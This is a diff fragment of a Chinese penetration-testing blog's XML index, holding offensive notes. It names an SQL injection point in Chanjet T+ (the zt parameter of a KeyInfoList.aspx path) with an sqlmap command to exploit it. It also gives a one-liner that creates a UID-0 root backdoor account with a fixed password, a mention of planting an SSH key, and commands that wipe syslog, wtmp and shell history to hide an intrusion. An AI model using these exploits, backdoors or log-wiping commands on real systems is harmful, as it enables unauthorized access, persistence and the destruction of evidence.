-    <content><![CDATA[<h1 id="畅捷通">1. 畅捷通</h1><h2 id="畅捷通前台SQL注入漏洞">1.1. 畅捷通前台SQL注入漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前台管理员的AccountNum参数存在漏洞</span><br><span class="line">下图处抓包</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/08/23/JoqrS3HZMEmUA6W.png" alt="image-20220822235322033_1_.png"></p>
-<h2 id="畅捷通未授权访问SQL注入漏洞">1.2. 畅捷通未授权访问SQL注入漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏洞点为如下目录的zt参数</span><br><span class="line">/tplus/UFAQD/KeyInfoList.aspx?preload=1&amp;zt=1	</span><br><span class="line">sqlmap运行参数如下:</span><br><span class="line">sqlmap -u &quot;target_url&quot; -p zt --level 5  --tamper=space2comment --random-agent</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220822235130899.png" alt="image-20220822235130899"></p>
-<p><img src="https://s2.loli.net/2022/08/22/lp21JfDZECQw6rq.png" alt="image-20220822234600880"></p>
-]]></content>
-      <categories>
-        <category>WEB应用</category>
       </categories>
   </entry>
   <entry>
@@ -1396,20 +1436,6 @@
 <h2 id="linux">1.2. linux</h2><h3 id="一句话新建用户，并加入管理员组">1.2.1. 一句话新建用户，并加入管理员组</h3><p><code>useradd -p openssl passwd -1 -salt &#39;qax&#39; qaxnb@123 -u 0 -g root -G root -s /bin/bash -d /usr/bin/qaxnb qaxnb</code></p>
 <p>（最后的qaxnb为账号,qaxnb@123为密码）</p>
 <p>添加ssh公钥</p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>痕迹清除</title>
-    <url>/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4.html</url>
-    <content><![CDATA[<p>痕迹清除</p>
-<p>windows</p>
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/mAeIuY1lChFbxoR.png" alt="image-20220804073428642"></p>
-<p>linux</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &gt; /var/log/syslog  // 清除系统日志</span><br><span class="line"></span><br><span class="line">echo &gt; /var/log/wtmp  // 清除用户登录日志</span><br><span class="line"></span><br><span class="line">history -c  // 清除history痕迹</span><br></pre></td></tr></table></figure>
-
 ]]></content>
       <categories>
         <category>内网渗透</category>
